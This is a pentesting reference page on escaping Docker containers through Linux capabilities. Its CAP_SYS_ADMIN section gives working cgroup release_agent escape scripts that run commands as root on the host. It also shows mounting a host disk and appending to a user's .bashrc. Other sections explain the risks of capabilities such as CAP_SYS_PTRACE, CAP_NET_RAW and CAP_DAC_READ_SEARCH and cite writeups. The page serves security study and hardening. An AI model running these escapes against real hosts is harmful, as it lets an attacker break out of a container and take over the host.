Running a Docker container with `--privileged` or dangerous capabilities allows privileged operations. 

{% hint style="info" %}
The `--privileged` flag gives all [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) to the container, and it also lifts all the limitations enforced by the device cgroup controller. In other words, the container can then do almost everything that the host can do. 
{% endhint %}

You can use the [capsh](https://man7.org/linux/man-pages/man1/capsh.1.html) command to see granted capabilities:

```bash
$ capsh --print | grep Current
```

# CAP_SYS_ADMIN

[CAP_SYS_ADMIN](https://man7.org/linux/man-pages/man7/capabilities.7.html) is largely a catchall capability, it can easily lead to additional capabilities or full root (typically access to all capabilities). `CAP_SYS_ADMIN` is required to perform a range of administrative operations, which is difficult to drop from containers if privileged operations are performed within the container. Retaining this capability is often necessary for containers which mimic entire systems versus individual application containers which can be more restrictive.

## Abusing usermode helper API

Privileged containers can register usermode application helpers that are executed in the kernel context, for more information on invoking user-space applications from kernel see [here](https://developer.ibm.com/technologies/linux/articles/l-user-space-apps/).

The [@_fel1x](https://twitter.com/_fel1x/status/1151487051986087936) escape technique is based on abusing the functionality of the `notify_on_release` feature in cgroups v1 to run the exploit as a fully privileged root user.

Here is a version of the PoC that launches `ps` on the host:

```bash
# Finds + enables a cgroup release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# Enables notify_on_release in the cgroup
mkdir -p $d/w; echo 1 > $d/w/notify_on_release
# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent
# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c
# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1
# Reads the output
cat /o
```

### Requirements to use this technique

In fact, `--privileged` provides far more permissions than needed to escape a Docker container via this method. In reality, the "only" requirements are:
- You must be running as root inside the container.
- The container must be run with the `CAP_SYS_ADMIN` Linux capability.
- The container must lack an AppArmor profile, or otherwise allow the mount syscall.
- The cgroup v1 virtual filesystem must be mounted read-write inside the container.

### Using cgroups to deliver the exploit

The PoC abuses the functionality of the `notify_on_release` feature in cgroups v1 to run the exploit as a fully privileged root user.

When the last task in a cgroup leaves (by exiting or attaching to another cgroup), a command supplied in the `release_agent` file is executed. The intended use for this is to help prune abandoned cgroups. This command, when invoked, is run as a fully privileged root on the host.

[What does notify_on_release do?](https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt)

If the `notify_on_release` flag is enabled in a cgroup, then whenever the last task in the cgroup leaves (exits or attaches to some other cgroup) and the last child cgroup of that cgroup is removed, then the kernel runs the command specified by the contents of the `release_agent` file in that hierarchy's root directory, supplying the pathname (relative to the mount point of the cgroup file system) of the abandoned cgroup. This enables automatic removal of abandoned cgroups. The default value of `notify_on_release` in the root cgroup at system boot is disabled. The default value of other cgroups at creation is the current value of their parents `notify_on_release` settings. The default value of a cgroup hierarchy's `release_agent` path is empty.

### Escape only with CAP_SYS_ADMIN capability

There is a simpler way to write this exploit so it works without the `--privileged` flag. In this scenario, you won't have access to a read-write cgroup mount provided by `--privileged`. For this you will just mount the cgroup as read-write ourselves. This adds one extra line to the exploit but requires fewer privileges.

An example of a command to run the container on the host:

```bash
$ docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```

The exploit below will execute a `ps aux` command on the host and save its output to the `/output` file in the container. It uses the same `release_agent` feature as the original PoC to execute on the host.

```bash
# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release
# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent
# Creates a payload
echo "#!/bin/sh" > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits 
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
# Reads the output
cat /output
```

## Abusing exposed host directories

Assusme, the `/home` directory is exposed by `/dev/sdb1` within a privileged container. In such case, you can generate a device node for that block device, mount it into the container, and gain access to host's `/home` directory.

```bash
$ docker run --privileged -it --rm alpine:latest
/ $ apk update && apk add util-linux
# ...
/ $ lsblk
NAME      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda         8:0    0   45G  0 disk
├─sda1      8:1    0 40.9G  0 part /etc/hosts
├─sda2      8:2    0   16M  0 part
├─sda3      8:3    0    2G  0 part
│ └─vroot 253:0    0  1.2G  1 dm
├─sda4      8:4    0   16M  0 part
├─sda5      8:5    0    2G  0 part
├─sda6      8:6    0  512B  0 part
├─sda7      8:7    0  512B  0 part
├─sda8      8:8    0   16M  0 part
├─sda9      8:9    0  512B  0 part
├─sda10     8:10   0  512B  0 part
├─sda11     8:11   0    8M  0 part
└─sda12     8:12   0   32M  0 part
sdb         8:16   0    5G  0 disk
└─sdb1      8:17   0    5G  0 part
zram0     252:0    0  768M  0 disk [SWAP]
/ $ mknod /dev/sdb1 block 8 17
/ $ mkdir /mnt/host_home
/ $ mount /dev/sdb1 /mnt/host_home
/ $ echo 'echo "Hello from container land!" 2>&1' >> /mnt/host_home/eric_chiang_m/.bashrc
```

References:
- [Writeup: Privileged Containers Aren't Containers](https://ericchiang.github.io/post/privileged-containers/)

# CAP_SYS_MODULE

[CAP_SYS_MODULE](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows the process to load and unload arbitrary kernel modules (`init_module(2)`, `finit_module(2)` and `delete_module(2)` system calls). This could lead to trivial privilege escalation and ring-0 compromise. The kernel can be modified at will, subverting all system security, Linux Security Modules, and container systems.

{% hint style="info" %}
CAP_SYS_MODULE capability dropped by Docker in privileged containers.
{% endhint %}

References:
- [Writeup: How I Hacked Play-with-Docker and Remotely Ran Code on the Host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

# CAP_SYS_RAWIO

[CAP_SYS_RAWIO](https://man7.org/linux/man-pages/man7/capabilities.7.html) provides a number of sensitive operations including access to `/dev/mem`, `/dev/kmem` or `/proc/kcore`, modify `mmap_min_addr`, access `ioperm(2)` and `iopl(2)` system calls, and various disk commands. The `FIBMAP ioctl(2)` is also enabled via this capability, which has caused issues in the [past](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). As per the man page, this also allows the holder to descriptively `perform a range of device-specific operations on other devices`. 

# CAP_NET_ADMIN

[CAP_NET_ADMIN](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows the capability holder to modify the exposed network namespaces' firewall, routing tables, socket permissions, network interface configuration and other related settings on exposed network interfaces. This also provides the ability to enable promiscuous mode for the attached network interfaces and potentially sniff across namespaces.

It should be noted several privilege escalation vulnerabilities and other historical weaknesses have resulted from the ability to leverage this capability. This includes CVE-2011-1019 which effectively granted the CAP_SYS_MODULE capability to load arbitrary modules and was exploited trivially using ifconfig CVE-2010-4655 which resulted in a sensitive heap memory disclosure and CVE-2013-4514 resulting in Denial of Service and possibly arbitrary code execution. These issues are largely due to the significant attack surface and implicit module loading for special interfaces or socket types.

# CAP_SYS_CHROOT

[CAP_SYS_CHROOT](https://man7.org/linux/man-pages/man7/capabilities.7.html) permits the use of the `chroot(2)` system call. This may allow escaping of any `chroot(2)` environment, using known weaknesses and escapes:
- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

# CAP_SYS_PTRACE

[CAP_SYS_PTRACE](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows to use `ptrace(2)` and recently introduced cross memory attach system calls such as `process_vm_readv(2)` and `process_vm_writev(2)`. If this capability is granted and the `ptrace(2)` system call itself is not blocked by a seccomp filter, this will allow an attacker to bypass other seccomp restrictions, see [PoC for bypassing seccomp if ptrace is allowed](https://gist.github.com/thejh/8346f47e359adecd1d53). 

References:
- [tbhaxor: Container Breakout – Part 1 (LAB: Process Injection)](https://tbhaxor.com/container-breakout-part-1/)

# CAP_NET_RAW

[CAP_NET_RAW](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows a process to be able to create RAW and PACKET socket types for the available network namespaces. This allows arbitrary packet generation and transmission through the exposed network interfaces. In many cases this interface will be a virtual Ethernet device which may allow for a malicious or compromised container to spoof packets at various network layers. A malicious process or compromised container with this capability may inject into upstream bridge, exploit routing between containers, bypass network access controls, and otherwise tamper with host networking if a firewall is not in place to limit the packet types and contents. Finally, this capability allows the process to bind to any address within the available namespaces. This capability is often retained by privileged containers to allow ping to function by using RAW sockets to create ICMP requests from a container.

Docker setup container networking so that all containers share the same Linux virtual bridge. These containers will be able to communicate with each other. Even if this direct network access is disabled (using the `-icc=false` flag for Docker), containers are not restricted for link-layer traffic. In particular, it is possible (and in fact quite easy) to conduct an ARP spoofing attack on another container within the same host system, allowing full middle-person attacks of the targeted container's traffic.

# CAP_SYS_BOOT

[CAP_SYS_BOOT](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows to use the `reboot(2)` syscall. It also allows for executing an arbitrary reboot command via `LINUX_REBOOT_CMD_RESTART2`, implemented for some specific hardware platforms. 

This capability also permits use of the `kexec_load(2)` system call, which loads a new crash kernel and as of Linux 3.17, the `kexec_file_load(2)` which also will load signed kernels.

# CAP_SYSLOG
 
[CAP_SYSLOG](https://man7.org/linux/man-pages/man7/capabilities.7.html) was finally forked in Linux 2.6.37 from the `CAP_SYS_ADMIN` catchall, this capability allows the process to use the `syslog(2)` system call. This also allows the process to view kernel addresses exposed via `/proc` and other interfaces when `/proc/sys/kernel/kptr_restrict` is set to 1.

The `kptr_restrict` sysctl setting was introduced in 2.6.38, and determines if kernel addresses are exposed. This defaults to zero (exposing kernel addresses) since 2.6.39 within the vanilla kernel, although many distributions correctly set the value to 1 (hide from everyone accept uid 0) or 2 (always hide).

In addition, this capability also allows the process to view `dmesg` output, if the `dmesg_restrict` setting is 1. Finally, the `CAP_SYS_ADMIN` capability is still permitted to perform `syslog` operations itself for historical reasons.

# CAP_DAC_READ_SEARCH

[CAP_DAC_READ_SEARCH](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows a process to bypass file read, and directory read and execute permissions. While this was designed to be used for searching or reading files, it also grants the process permission to invoke `open_by_handle_at(2)`. Any process with the capability `CAP_DAC_READ_SEARCH` can use `open_by_handle_at(2)` to gain access to any file, even files outside their mount namespace. The handle passed into `open_by_handle_at(2)` is intended to be an opaque identifier retrieved using `name_to_handle_at(2)`. However, this handle contains sensitive and tamperable information, such as inode numbers. This was first shown to be an issue in Docker containers by Sebastian Krahmer with [shocker](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) exploit.

> Docker has mitigated this issue by dropping CAP_DAC_READ_SEARCH (as well as blocking access to open_by_handle_at using seccomp)

# References

- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)
- [Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
